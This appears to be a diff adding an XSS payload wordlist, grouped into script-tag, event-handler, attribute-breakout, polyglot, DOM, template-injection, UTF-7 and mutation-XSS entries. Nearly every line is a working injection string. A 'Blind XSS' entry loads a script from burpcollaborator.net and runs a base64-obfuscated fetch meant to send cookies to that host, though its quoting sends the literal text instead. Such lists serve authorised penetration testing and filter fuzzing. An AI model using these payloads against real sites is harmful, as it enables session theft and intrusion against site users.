@@ -1,0 +1,54 @@
+# XSS Payloads
+# Categories: Basic, Event Handler, Polyglot, DOM, Blind, React-specific
+
+# === Basic Script ===
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+
+# === HTML Event Handlers ===
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video onloadstart=alert(1) src=x>
+<marquee onstart=alert(1)>
+
+# === Attribute-Based ===
+" onmouseover=alert(1) x="
+" onfocus=alert(1) autofocus x="
+' onfocus=alert(1) autofocus x='
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+
+# === Polyglot ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
+
+# === DOM-Based (no HTML injection needed) ===
+#constructor.constructor('alert(1)')()
+#{"a":1}['constructor']['constructor']('alert(1)')()
+
+# === React/Special Contexts ===
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+<%%=alert(1)%%>
+
+# === Blind XSS (Triggers callback) ===
+<script src=https://burpcollaborator.net/xss.js></script><img src=x onerror=eval(atob('ZmV0Y2goImh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvP2M9ZG9jdW1lbnQuY29va2llIik='))>
+
+# === No Script Tags (Bypass filters) ===
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+# === UTF-7 (Older browsers) ===
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# === Mutation XSS (mXSS) ===
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
